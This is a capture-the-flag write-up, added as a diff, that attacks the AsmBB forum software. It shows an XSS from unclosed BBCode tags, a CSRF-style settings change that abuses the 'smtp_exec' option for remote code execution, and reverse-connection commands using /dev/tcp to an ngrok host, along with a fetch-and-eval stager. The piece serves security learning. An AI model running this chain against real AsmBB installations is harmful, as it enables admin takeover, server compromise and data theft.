@@ -1,0 +1,493 @@
+<h1>true_web_assembly</h1>
+
+<h2>Description</h2>
+
+<blockquote>
+  <p><a href="https://board.asm32.info/asmbb-v2-9-has-been-released.328/">https://board.asm32.info/asmbb-v2-9-has-been-released.328/</a></p>
+  
+  <p>From the post:</p>
+  
+  <ul>
+  <li>“AsmBB is very secure web application, because of the internal design and the reduced dependencies. But it also supports encrypted databases, for even higher security.”</li>
+  <li>“Download, install and hack”</li>
+  </ul>
+  
+  <p>Yes</p>
+</blockquote>
+
+<h2>Solution</h2>
+
+<p>The challenge is to attack the latest version of <a href="https://asm32.info/fossil/asmbb/index">AsmBB</a>, a web-based message board implemented entirely in x86 assembly. The provided Dockerfile builds the <code>asmbb</code> engine using the source files from the <code>asmbb</code> and <code>freshlib</code> repositories.</p>
+
+<p>```docker</p>
+
+<h1>Get source files for asmbb</h1>
+
+<p>RUN wget https://asm32.info/fossil/asmbb/tarball/4c91cddaec/asmbb-4c91cddaec.tar.gz -O asmbb.tar.gz &amp;&amp; \
+    /bin/bash -c "echo 'b1e621d1ae988b35e836ec9142ccc6ce6cf7c24a090c4d973894770a62fa4ddc asmbb.tar.gz' | sha256sum --check" &amp;&amp; \
+    tar -xf asmbb.tar.gz || true &amp;&amp; \
+    mv asmbb-* asmbb</p>
+
+<h1>Get source files for freshlib</h1>
+
+<h1>AsmBB uses functions from freshlib</h1>
+
+<p>RUN wget https://fresh.flatassembler.net/fossil/repo/fresh/tarball/6636a57441/Fresh+IDE-6636a57441.tar.gz -O fresh.tar.gz &amp;&amp; \
+    /bin/bash -c "echo '5ba395b0e957536bd66abc572414085aab5f2a527d28214881bbba72ec53e00d fresh.tar.gz' | sha256sum --check" &amp;&amp; \
+    tar -xf fresh.tar.gz &amp;&amp; \
+    mv Fresh* Fresh</p>
+
+<h1>Build the asmbb engine</h1>
+
+<p>RUN lib=/Fresh/freshlib TargetOS=Linux /fasm/fasm -m 200000 /asmbb/source/engine.asm /engine
+```</p>
+
+<h2>Gaining XSS</h2>
+
+<p>The forum is the main feature of AsmBB, and the default build uses a custom markdown-like parser called MiniMag. Our goal is to achieve a GET-based XSS on the admin user, and subsequently abuse admin features for RCE.</p>
+
+<figure><img src="../../.gitbook/assets/Screenshot 2023-03-12 at 10.18.45 PM.png" alt=""><figcaption></figcaption></figure>
+
+<p>Let's take a look at the AsmBB <a href="https://asm32.info/fossil/asmbb">source</a>. <a href="https://asm32.info/fossil/asmbb/file?name=source/render2.asm\&ci=4c91cddaec90fb74"><code>render2.asm</code></a> contains a "hash table" of commands used by the templating engine, mapped to their routines.</p>
+
+<p><code>nasm
+PHashTable tableRenderCmd, tpl_func,                      \
+        'special:',     RenderTemplate.cmd_special,       \
+        'raw:',         RenderTemplate.cmd_raw,           \
+        'include:',     RenderTemplate.cmd_include,       \
+        'minimag:',     RenderTemplate.cmd_minimag,       \   ; HTML, no encoding.
+        'bbcode:',      RenderTemplate.cmd_bbcode,        \   ; HTML, no encoding.
+        'html:',        RenderTemplate.cmd_html,          \   ; HTML, disables the encoding.
+        'attachments:', RenderTemplate.cmd_attachments,   \   ; HTML, no encoding.
+        'attach_edit:', RenderTemplate.cmd_attachedit,    \   ; HTML, no encoding.
+        'url:',         RenderTemplate.cmd_url,           \   ; Needs encoding!
+        'json:',        RenderTemplate.cmd_json,          \   ; No encoding.
+        'css:',         RenderTemplate.cmd_css,           \   ; No output, no encoding.
+        'equ:',         RenderTemplate.cmd_equ,           \
+        'const:',       RenderTemplate.cmd_const,         \
+        'enc:',         RenderTemplate.cmd_encode,        \   ; encode the content in html encoding.
+        'usr:',         RenderTemplate.cmd_user_encode    \   ; encodes the unicode content of the user nickname for unicode-clones distinction.
+</code></p>
+
+<p>We can see this in action in <a href="https://asm32.info/fossil/asmbb/file?name=www/templates/Urban+Sunrise/post_view.tpl\&ci=4c91cddaec90fb74"><code>post_view.tpl</code></a> where the post is rendered. Depending on <code>format</code>, the post content is either parsed with <code>minimag</code> or <code>bbcode</code>, and the final output is rendered as HTML.</p>
+
+<p>```html</p>
+
+<article class="post-text">
+  [html:[[case:[format]|minimag:[include:minimag_suffix.tpl]|bbcode:][Content]]]
+
+</article>
+
+<p>```</p>
+
+<p>Although the client-side UI only allows us to write content in the MiniMag format, the POST request to submit the post does include a <code>format</code> parameter.</p>
+
+<p>```http
+POST /!post HTTP/1.1
+Host: localhost:9032
+Content-Length: 917
+...
+Connection: close</p>
+
+<p>...</p>
+
+<p>------WebKitFormBoundarydKCsA6RKHAepAWPn
+Content-Disposition: form-data; name="format"</p>
+
+<p>0
+------WebKitFormBoundarydKCsA6RKHAepAWPn
+Content-Disposition: form-data; name="source"</p>
+
+<p>[http://example.com][My link] 
+------WebKitFormBoundarydKCsA6RKHAepAWPn--
+```</p>
+
+<p>When set to 1, the <code>format</code> parameter allows us to use the <a href="https://en.wikipedia.org/wiki/BBCode">BBCode</a> parser instead. This uses the <code>bbcode</code> command, which calls the <code>.cmd_bbcode</code> routine.</p>
+
+<p>```nasm
+.cmd_bbcode:
+; here esi points to ":" of the "bbcode:" command. edi points to the start "[" and ecx points to the end "]"</p>
+
+<p>locals
+  BenchVar .bbcode_time
+endl</p>
+
+<pre><code>    BenchmarkStart .bbcode_time
+
+    stdcall TextMoveGap, edx, ecx
+    stdcall TextSetGapSize, edx, 4
+    mov     dword [edx+ecx], 0
+    add     [edx+TText.GapBegin], 4
+    inc     [edx+TText.GapEnd]              ; delete the end "]"
+
+    stdcall TextMoveGap, edx, edi
+    add     [edx+TText.GapEnd], 8
+
+    stdcall TranslateBBCode, edx, edi, SanitizeURL
+
+    ...
+</code></pre>
+
+<p>```</p>
+
+<p>Since the BBCode parser was a <a href="https://board.asm32.info/the-latest-update-of-this-forum.258/">newer</a> parser introduced after MiniMag, and isn't enabled by default, we thought this would be the best place to start looking for parser vulnerabilities.</p>
+
+<p>The <code>TranslateBBCode</code> routine from <a href="https://fresh.flatassembler.net/fossil/repo/fresh/artifact/0457fbe206805cbe"><code>bbcode.asm</code></a> (found in <a href="https://fresh.flatassembler.net/fossil/repo/fresh">FreshLib</a>) is then used to parse the BBCode content. Here we see a table of supported BBCode tags.</p>
+
+<p>```nasm
+PHashTable tableBBtags, tpl_func,                      \
+        'b',       tagStrong,                          \
+        '*',       tagListItem,                        \
+        'i',       tagEm,                              \
+        'u',       tagUnderlined,                      \
+        's',       tagDel,                             \
+        'c',       tagInlineCode,                      \
+        'url',     tagURL,                             \
+        'img',     tagImg,                             \
+        'quote',   tagQuote,                           \</p>
+
+<pre><code>    ...
+</code></pre>
+
+<p>```</p>
+
+<p>BBCode is an old markup language that has a rather simple syntax. Tags are enclosed by square brackets, and some tags can have attributes, such as the following URL tag:</p>
+
+<p><code>bbcode
+[url=https://example.com]My link[/url]
+</code></p>
+
+<p>The main loop of the parser is found at <code>.loop</code>. For each character, the logic goes:</p>
+
+<ul>
+<li>if the end of the text has been reached, exit the loop</li>
+<li>if it is a newline or space character, skip it</li>
+<li>if it is <code>[</code>, process the tag at <code>.start_tag</code></li>
+<li>if it is the start of an emoji, process the emoji</li>
+</ul>
+
+<p>```nasm
+.loop:
+        mov     ecx, [edx+TText.GapEnd]
+        cmp     ebx, [edx+TText.GapBegin]
+        cmovb   ecx, [edx+TText.GapBegin]
+        sub     ecx, [edx+TText.GapBegin]
+        add     ecx, ebx
+        cmp     ecx, [edx+TText.Length]
+        jae     .end<em>of</em>text</p>
+
+<pre><code>    movzx   eax, byte [edx+ecx]
+
+    test    al, al
+    jz      .end_of_text
+
+    cmp     al, $0d
+    je      .new_line
+
+    cmp     al, $0a
+    je      .new_line
+
+    cmp     al, $20
+    jbe     .next           ; skip all whitespace
+
+    ...
+</code></pre>
+
+<p>.paragraph_ok:</p>
+
+<pre><code>    cmp     al, "["
+    je      .start_tag
+</code></pre>
+
+<p>; here check for emoticons</p>
+
+<pre><code>    cmp     al, $f0         ; emoji?
+    jb      .continue
+
+    ...
+</code></pre>
+
+<p>```</p>
+
+<p>Otherwise, we go to <code>.continue</code>, where the character is HTML encoded.</p>
+
+<p>```nasm
+.continue:</p>
+
+<p>; html encoding from here</p>
+
+<pre><code>    test    al, al          ; all values &gt; 127 are unicode and should not be encoded.
+    js      .next
+
+    movzx   eax, byte [tbl_html+eax]
+    test    al, al
+    jz      .del_char
+    jns     .next           ; the same as above
+
+    lea     esi, [eax+tbl_html]     ; the address of the replacement string.
+    lodsb
+    movzx   ecx, al         ; length
+</code></pre>
+
+<p>; insert the replacement html encoding from esi
+        stdcall TextMoveGap, edx, ebx
+        stdcall TextSetGapSize, edx, ecx
+        inc     [edx+TText.GapEnd]      ; delete the previous char.</p>
+
+<pre><code>    mov     edi, [edx+TText.GapBegin]
+    add     edi, edx
+    add     [edx+TText.GapBegin], ecx
+    add     ebx, ecx
+
+    rep movsb
+    jmp     .loop
+</code></pre>
+
+<p>```</p>
+
+<p>Notice that unless the current character is part of an emoji or part of an opening/closing tag, we will reach the HTML-encoding logic. This is done through a simple text substitution that sanitizes angle brackets, quotes, and ampersands.</p>
+
+<p><code>nasm
+HtmlEntities tbl_html,        \
+  $09, $0d,                   \
+  $0a, $0a,                   \
+  $0d, $0d,                   \
+  '&lt;', '&amp;lt;',                \
+  '&gt;', '&amp;gt;',                \
+  '"', '&amp;quot;',              \
+  "'", '&amp;apos;',              \
+  '&amp;', '&amp;amp;'
+</code></p>
+
+<p>Since everything outside the opening/closing tag are HTML-encoded, let's take a closer look at the tag-processing logic. When a tag is matched, a string substitution is performed based on the table below.</p>
+
+<p>```nasm
+...</p>
+
+<p>tagImg          onetag <txt '<img class="block"', HTML_IMG_ATTR, 'alt="'>, txt '" src="',  txt '" />',         fBlockTag  or fDisableTags or fURLContent
+tagInlineImg    onetag <txt '<img class="inline"', HTML_IMG_ATTR,'alt="'>, txt '" src="',  txt '" />',         fInlineTag or fDisableTags or fURLContent
+tagSize         onetag txt '<span style="font-size:',               txt '">',       txt '</span>',      fInlineTag
+tagColor        onetag txt '<span style="color:',                   txt '">',       txt '</span>',      fInlineTag
+tagEmail        onetag txt '<a href="mailto:',                      txt '">',       txt '</a>',         0</p>
+
+<p>...
+```</p>
+
+<p>The 2nd, 3rd, and 4th columns correspond to the start of the tag, end of the attribute, and end of the tag respectively. For instance, the following markup</p>
+
+<p><code>bbcode
+[email=example@example.com]Click Here[/email]
+</code></p>
+
+<p>becomes</p>
+
+<p><code>
+&lt;a href="mailto: + example@example.com + "&gt; + Click Here + &lt;/a&gt;
+</code></p>
+
+<p>The attribute value and the content in between the opening/closing tags are processed separately from the tag itself, and are thus subject to HTML-encoding. If there's any parsing bug to be found, it would probably have to be while parsing the tag.</p>
+
+<p><em>What if we just don't close the tag?</em></p>
+
+<p>Since the tag isn't being encoded while it is processed, there might be an edge case where the unencoded content is reflected in the absence of a closing <code>]</code>.</p>
+
+<p><em>Voilà</em>, the following markup</p>
+
+<p><code>bbcode
+[email=&lt;img src=x onerror=alert() 
+</code></p>
+
+<p>translates to</p>
+
+<p><code>html
+&lt;a href="mailto:&amp;lt;img src=x onerror=alert() "&gt;&lt;img src=x onerror=alert() &lt;/a&gt;
+</code></p>
+
+<p>which when rendered on a browser, pops an alert!</p>
+
+<figure><img src="../../.gitbook/assets/Screenshot 2023-03-13 at 9.59.13 PM.png" alt=""><figcaption></figcaption></figure>
+
+<h2>Honourable Mentions</h2>
+
+<p>We also found two POST-based XSS vectors, which unfortunately were unusable in this challenge in the absence of an open redirect (since the admin bot is only able to visit the challenge page, and no other page).</p>
+
+<p>The first was a POST request to <code>!post</code>. This would have reflected the XSS payload in the page <code>&lt;title&gt;</code>.</p>
+
+<p><code>markup
+&lt;html&gt;
+  &lt;body&gt;
+    &lt;form action="http://localhost:9032/!post" method="POST"&gt;
+      &lt;input type="hidden" name="attach" value="" /&gt;
+      &lt;input type="hidden" name="format" value="0" /&gt;
+      &lt;input type="hidden" name="invited" value="1" /&gt;
+      &lt;input type="hidden" name="limited" value="1" /&gt;
+      &lt;input type="hidden" name="preview" value="p" /&gt;
+      &lt;input type="hidden" name="source" value="foo" /&gt;
+      &lt;input type="hidden" name="tabselector" value="0" /&gt;
+      &lt;input type="hidden" name="tags" value="17" /&gt;
+      &lt;input type="hidden" name="ticket" value="foo" /&gt;
+      &lt;input type="hidden" name="title" value="e&amp;lt;&amp;#47;title&amp;gt;&amp;lt;script&amp;gt;alert&amp;#40;origin&amp;#41;&amp;lt;&amp;#47;script&amp;gt;" /&gt;
+      &lt;input type="submit" value="Submit request" /&gt;
+    &lt;/form&gt;
+  &lt;/body&gt;
+&lt;/html&gt;
+</code></p>
+
+<figure><img src="../../.gitbook/assets/Screenshot 2023-03-13 at 10.03.35 PM.png" alt=""><figcaption></figcaption></figure>
+
+<p>The second is a HTTP response splitting attack. The <code>!skincookie</code> endpoint reflects form data in the <code>Set-Cookie</code> header, and allows for for CRLF injection. In addition to XSS, this can be used to set arbitrary cookies and response headers.</p>
+
+<figure><img src="../../.gitbook/assets/Screenshot 2023-03-13 at 10.14.38 PM.png" alt=""><figcaption></figcaption></figure>
+
+<h2>Gaining RCE</h2>
+
+<p>Armed with admin privileges, one would see a suspiciously named setting in <code>/!settings</code>.</p>
+
+<figure><img src="../../.gitbook/assets/Screenshot 2023-03-13 at 10.18.53 PM.png" alt=""><figcaption></figcaption></figure>
+
+<p>A setting called "Pipe the emails through" sure sounds promising for RCE. Looking for the form key <code>smtp_exec</code> shows us that this option is being used in <a href="https://asm32.info/fossil/asmbb/file?name=source/commands.asm\&ci=4c91cddaec90fb74"><code>commands.asm</code></a> when sending a user activation email.</p>
+
+<p>```nasm
+proc SendActivationEmail, .stmt</p>
+
+<p>.stmt2     dd ?
+.subj      dd ?
+.body      dd ?</p>
+
+<p>.host      dd ?
+.from      dd ?
+.to        dd ?
+.smtp<em>addr dd ?
+.smtp</em>port dd ?
+.exec      dd ?</p>
+
+<p>begin</p>
+
+<pre><code>    ...
+
+    xor     eax, eax
+    stdcall GetParam, txt "smtp_exec", gpString
+    mov     [.exec], eax
+    test    eax, eax
+    jnz     .addresses_ok
+
+    ...
+</code></pre>
+
+<p>; send by external program.</p>
+
+<pre><code>    stdcall CreatePipe
+    mov     ebx, eax
+
+    stdcall FileWriteString, edx, txt "From: "
+    stdcall FileWriteString, edx, [.from]
+    stdcall FileWriteString, edx, txt "@"
+    stdcall FileWriteString, edx, [.host]
+    stdcall FileWriteString, edx, &lt;txt 13, 10&gt;
+
+    stdcall FileWriteString, edx, txt "To: "
+    stdcall FileWriteString, edx, [.to]
+    stdcall FileWriteString, edx, &lt;txt 13, 10&gt;
+
+    stdcall FileWriteString, edx, txt "Subject: "
+    stdcall FileWriteString, edx, [.subj]
+    stdcall FileWriteString, edx, &lt;txt 13, 10&gt;
+
+    stdcall FileWriteString, edx, [.body]
+    stdcall FileWriteString, edx, &lt;txt 13, 10&gt;
+
+    stdcall FileClose, edx
+    stdcall Exec2, [.exec], ebx, [STDOUT], [STDERR]
+    stdcall WaitProcessExit, eax, -1
+
+    stdcall FileClose, ebx
+    clc
+    jmp     .finish
+</code></pre>
+
+<p>```</p>
+
+<p>Looks like our <code>smtp_exec</code> option is being passed to <code>Exec2</code>. A quick look at <a href="https://fresh.flatassembler.net/fossil/repo/fresh/artifact/6e99edc24ea48311"><code>process.asm</code></a> reveals that this spawns a child process with our input. Great!</p>
+
+<p>```nasm
+body Exec2
+.pArgs dd ?
+begin
+        pushad</p>
+
+<pre><code>    stdcall StrSplitArg, [.hCommand]
+    mov     [.pArgs], eax
+
+    mov     eax, sys_fork
+    int     $80
+
+    test    eax, eax
+    jnz     .parent         ; this is the parent process
+</code></pre>
+
+<p>; here is the child.</p>
+
+<pre><code>    DebugMsg "Child process here!"
+
+    ...
+</code></pre>
+
+<p>```</p>
+
+<p>All we have to do now is to change this option to a payload that sends us the flag.</p>
+
+<p><code>
+/bin/bash -c /readflag&gt;/dev/tcp/0.tcp.ngrok.io/11818
+</code></p>
+
+<h2>Putting It All Together</h2>
+
+<p>Here's the final exploit that we will serve to the admin. Here, I used a first-stage payload to keep the exploit small, but serving the whole exploit in one payload would work as well.</p>
+
+<p><code>javascript
+fetch("http://HOST:PORT/exploit.js").then(r=&gt;r.text()).then(eval)
+</code></p>
+
+<p>is converted to base64 and eval-ed:</p>
+
+<p>{% code overflow="wrap" %}
+<code>
+[color=&lt;img src=x onerror=eval(atob('ZmV0 ... bCk=')) 
+</code>
+{% endcode %}</p>
+
+<p>which then executes the RCE payload:</p>
+
+<p>``<code>javascript
+const rce = (smtp_exec, ticket) =&gt; {
+    fetch(</code>${window.origin}/!settings<code>, {
+        method: "POST",
+        headers: {
+            "Content-Type": "application/x-www-form-urlencoded"
+        },
+        body:</code>forum<em>title=&amp;forum</em>header=%3Ch1+style%3D%22font-weight%3A+800%22%3EAsmBB%3C%2Fh1%3E%0D%0A%3Cb+style%3D%22text-align%3A+center%22%3EPower%3Cbr%3E%0D%0A%3Csvg+version%3D%221.1%22+width%3D%2264%22+height%3D%2216%22+viewBox%3D%220+0+64+16%22+xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0D%0A+%3Cpath+d%3D%22m0+6+8+10h34l-6-6+28-2-50-8+8+8z%22%2F%3E%0D%0A%3C%2Fsvg%3E%0D%0A%3C%2Fb%3E%0D%0A&amp;description=&amp;keywords=&amp;tabselector=1&amp;host=asdf&amp;smtp<em>addr=asdf&amp;smtp</em>port=25<code>
+            +</code>&amp;smtp<em>exec=${smtp</em>exec}&amp;smtp<em>user=asdf&amp;email</em>confirm=on&amp;user<em>perm=1&amp;user</em>perm=2&amp;user<em>perm=4&amp;user</em>perm=8&amp;user<em>perm=16&amp;user</em>perm=64&amp;user<em>perm=256&amp;user</em>perm=512&amp;user<em>perm=1024&amp;post</em>interval=0&amp;post<em>interval</em>inc=0&amp;max<em>post</em>length=0&amp;anon<em>perm=1&amp;anon</em>perm=2&amp;activate<em>min</em>interval=0&amp;default<em>lang=0&amp;page</em>length=20&amp;default<em>skin=Urban+Sunrise&amp;default</em>mobile<em>skin=Urban+Sunrise&amp;chat</em>enabled=on&amp;markups=1&amp;password=<code>
+            +</code>&amp;ticket=${ticket}&amp;save=Save`
+    })
+}</p>
+
+<p>const smtp_exec = encodeURIComponent("/bin/bash -c /readflag>/dev/tcp/HOST/PORT")</p>
+
+<p>fetch(<code>${window.origin}/!settings</code>)
+    .then(response =&gt; response.text())
+    .then(text =&gt; {
+        const m = text.match(/name="ticket" value="([^"]+)"/);
+        console.log(m);
+        if (m) {
+            const ticket = m[1];
+            rce(smtp_exec, ticket)
+        }
+    });
+```</p>
+
+<p>Once the admin visits our exploit page, just register a new user and the flag will be sent to us!</p>
+
+<p><code>
+$ nc -lv 1337
+hxp{iTs_f4s7_iT$_sM4lL_NoB0d1_c4n_br3aK_!t_1f_n0b0dY_c4n_r3ad_i7}
+</code></p>
